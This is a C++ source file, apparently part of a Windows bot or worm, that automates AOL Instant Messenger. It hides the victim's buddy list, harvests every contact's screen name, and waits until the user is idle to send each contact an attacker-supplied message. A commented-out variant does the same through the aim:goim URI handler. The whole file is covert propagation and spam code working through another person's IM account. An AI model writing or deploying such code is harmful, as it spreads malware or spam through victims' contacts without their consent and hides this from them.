#include <winsock2.h>
#include "aim.h"

namespace AIM
{
	HWND GetTaskbarItem(VOID){
		HWND OscarNotify = FindWindow("_Oscar_StatusNotify", NULL);
		if(IsWindow(OscarNotify))
			return OscarNotify;
		return NULL;
	}

	HWND GetBuddyListWindow(VOID){
		HWND OscarNotify = GetTaskbarItem();
		if(OscarNotify){
			SendMessage(OscarNotify, WM_COMMAND, 20003, 0);
			HWND BuddyList = 0;
			HWND AimAd = 0;
			do{
				BuddyList = FindWindowEx(0, BuddyList, "#32770", NULL);
				if (IsWindow(BuddyList)){
					AimAd = FindWindowEx(BuddyList, 0, "_AimAd", NULL);
					if (IsWindow(AimAd))
						return BuddyList;
				}
			}
			while(IsWindow(BuddyList));
		}
		return NULL;
	}

	VOID SendIM(PCHAR ScreenName, LPCTSTR Message, BOOL Close){
		HWND OscarNotify = GetTaskbarItem();
		if(OscarNotify){
			SendMessage(OscarNotify, WM_COMMAND, 20000, 0);
			HWND TextBox = NULL;
			HWND WndAte = NULL;
			HWND IMWindow = FindWindowEx(0, 0, "AIM_IMessage", NULL);
			if(IsWindow(IMWindow)){
				do{
					WndAte = FindWindowEx(IMWindow, WndAte, "_Oscar_PersistantCombo", NULL);
					if(IsWindow(WndAte)){
						LRESULT Item = SendMessage(WndAte, CB_INSERTSTRING, 0, (LPARAM)ScreenName);
						SendMessage(WndAte, CB_SETCURSEL, Item, 0);
						WndAte = NULL;
					}
				}while(IsWindow(WndAte));
				do{
					WndAte = FindWindowEx(IMWindow, WndAte, "WndAte32Class", NULL);
					if(IsWindow(WndAte)){
						TextBox = FindWindowEx(WndAte, 0, "CBClass", NULL);
						if(IsWindow(TextBox)){
							TextBox = FindWindowEx(WndAte, 0, "Ate32Class", NULL);
							CHAR OldText[256];
							BOOL OldTextExists;
							Clipboard Clipboard;
							OldTextExists = Clipboard.GetData(CF_TEXT, (PBYTE)OldText, sizeof(OldText), TRUE);
							Clipboard.SetData(Clipboard.RegisterFormat("AOLMAIL"), (PBYTE)Message, strlen((PCHAR)Message) + 1);
							Clipboard.Close();
							SendMessage(TextBox, WM_COMMAND, 0x24F, 0); // Paste
							SendMessage(TextBox, WM_COMMAND, 0x10259, 0); // Send
							Clipboard.Open(NULL);
							if(OldTextExists){
								Clipboard.SetData(Clipboard.RegisterFormat("AOLMAIL"), (PBYTE)OldText, strlen((PCHAR)OldText) + 1);
							}else{
								Clipboard.Empty();
							}
							WndAte = NULL;
						}
					}
				}while(IsWindow(WndAte));
				/*do{
					WndAte = FindWindowEx(IMWindow, WndAte, "_Oscar_IconBtn", NULL);
					if(IsWindow(WndAte)){
						if(((INT)GetMenu(WndAte)) == 409){
							SendMessage(WndAte, WM_LBUTTONDOWN, 0, 0);
							SendMessage(WndAte, WM_LBUTTONUP, 0, 0);
							WndAte = 0;
						}
					}
				}while(IsWindow(WndAte));*/
			}
			if(Close)
				SendMessage(IMWindow, WM_CLOSE, 0, 0);
		}
	}

	std::vector<std::string> EnumBuddyList(HWND BuddyList){
		std::vector<std::string> ScreenNames;
		CHAR OwnName[256];
		GetWindowText(BuddyList, OwnName, sizeof(OwnName));
		*(strrchr(OwnName, '\'')) = NULL;
		HWND OscarTree = FindWindowEx(BuddyList, 0, "#32770", NULL);
		OscarTree = FindWindowEx(OscarTree, 0, "_Oscar_Tree", NULL);
		if(IsWindow(OscarTree)){
			INT ItemCount = SendMessage(OscarTree, LB_GETCOUNT, 0, 0);
			INT ItemIndex = -1;
			while(ItemCount > ItemIndex){
				SendMessage(OscarTree, LB_SETCURSEL, ++ItemIndex, 0);
				SendMessage(OscarTree, WM_KEYDOWN, 37, 0);
				SendMessage(OscarTree, WM_KEYUP, 37, 0);
			}
			ItemCount = SendMessage(OscarTree, LB_GETCOUNT, 0, 0);
			ItemIndex = ItemCount;
			--ItemIndex;
			while((--ItemIndex >= 0)){
				SendMessage(OscarTree, LB_SETCURSEL, ItemIndex, 0);
				SendMessage(OscarTree, WM_KEYDOWN, 39, 0);
				SendMessage(OscarTree, WM_KEYUP, 39, 0);
				INT Temp = SendMessage(OscarTree, LB_GETCOUNT, 0, 0);
				Temp -= (ItemCount - ItemIndex);
				for(INT i = ItemIndex + 1; i <= Temp; i++){
					CHAR ScreenName[64];
					SendMessage(OscarTree, LB_SETCURSEL, i, 0);
					SendMessage(OscarTree, LB_GETTEXT, i, (LPARAM)ScreenName);
					BOOL Exists = FALSE;
					for(UINT j = 0; j < ScreenNames.size(); j++)
						if(strcmp(ScreenName, ScreenNames[j].c_str()) == 0){
							Exists = TRUE;
							break;
						}
						if(!strchr(ScreenName, '(') && !Exists && stricmp(ScreenName, "Moviefone") != 0 &&
							stricmp(ScreenName, "ShoppingBuddy") != 0 && stricmp(ScreenName, "SmarterChild") != 0 &&
							stricmp(ScreenName, OwnName) != 0)
						ScreenNames.push_back(ScreenName);
				}
				SendMessage(OscarTree, LB_SETCURSEL, ItemIndex, 0);
			}
		}
		return ScreenNames;
	}

	class SpamBuddyListThread : public Thread
	{
	public:
		SpamBuddyListThread(PCHAR Message, DWORD MinIdleTime){
			strncpy(SpamBuddyListThread::Message, Message, sizeof(SpamBuddyListThread::Message));
			SpamBuddyListThread::MinIdleTime = MinIdleTime;
			StartThread();
		}

		VOID ThreadFunc(VOID){
			while(IdleTrack.GetIdleTime() < MinIdleTime)
				Sleep(1000);
			HWND BuddyList = GetBuddyListWindow();
			if(IsWindow(BuddyList)){
				ShowWindow(BuddyList, SW_HIDE);
				std::vector<std::string> ScreenNames = EnumBuddyList(BuddyList);
				for(UINT i = 0; i < ScreenNames.size(); i++){
					while(IdleTrack.GetIdleTime() < MinIdleTime)
						Sleep(1000);
					SendIM((PCHAR)ScreenNames[i].c_str(), Message, TRUE);
					Sleep(5000);
				}
				DestroyWindow(BuddyList);
			}
		}
	private:
		CHAR Message[512];
		DWORD MinIdleTime;
	};

	VOID SpamBuddyList(PCHAR Message, DWORD MinIdleTime){
		new SpamBuddyListThread(Message, MinIdleTime);
	}

/*	VOID Execute(PCHAR Command){
		SHELLEXECUTEINFO SEInfo;
		memset(&SEInfo, NULL, sizeof(SEInfo));
		SEInfo.cbSize = sizeof(SEInfo);
		SEInfo.fMask = NULL;
		cRegistry Reg;
		if(Reg.OpenKey(HKEY_CLASSES_ROOT, "aim\\shell\\open\\command") == ERROR_SUCCESS){
			if(Reg.Exists("")){
				CHAR File[MAX_PATH];
				strncpy(File, Reg.GetString(NULL) + 1, sizeof(File));
				*strrchr(File, '"') = NULL;
				SEInfo.lpFile = File;
				SEInfo.lpParameters = Command;
				SEInfo.nShow = SW_SHOWNORMAL;
				ShellExecuteEx(&SEInfo);
			}
		}
	}

	BOOL CALLBACK EnumChildIMs(HWND hWnd, LPARAM lParam);

	BOOL CALLBACK EnumIMs(HWND hWnd, LPARAM lParam){
		CHAR Title[256];
		GetWindowText(hWnd, Title, sizeof(Title));
		if(strcmp(Title, "Instant Message") == 0){
			EnumChildWindows(hWnd, EnumChildIMs, lParam);
			if(lParam & 1)
				SendMessage(hWnd, WM_CLOSE, NULL, NULL);
		}
		return TRUE;
	}

	BOOL CALLBACK EnumChildIMs(HWND hWnd, LPARAM lParam){
		CHAR ClassName[MAX_PATH];
		GetClassName(hWnd, ClassName, sizeof(ClassName));
		if(strcmp(ClassName, "Ate32Class") == 0){
			WINDOWINFO WindowInfo;
			GetWindowInfo(hWnd, &WindowInfo);
			if(WindowInfo.dwExStyle & WS_EX_ACCEPTFILES){
				AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(hWnd, NULL), TRUE);
				SetForegroundWindow(hWnd);
				SetFocus(hWnd);
				SendMessage(hWnd, WM_KEYDOWN, (WPARAM)VK_RETURN, NULL);
				SendMessage(hWnd, WM_KEYUP, (WPARAM)VK_RETURN, NULL);
				AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(hWnd, NULL), FALSE);
			}
		}
		return TRUE;
	}

	VOID SendIM(PCHAR Screenname, PCHAR Message, BOOL Close){
		CHAR Command[1024];
		strcpy(Command, "aim:goim?screenname=");
		strcat(Command, Screenname);
		strcat(Command, "&message=");
		strcat(Command, Message);
		for(UINT i = 0; i < strlen(Command); i++)
			if(Command[i] == ' ')
				Command[i] = '+';
		Execute(Command);
		Sleep(600);
		EnumWindows((WNDENUMPROC)EnumIMs, Close);
	}*/
}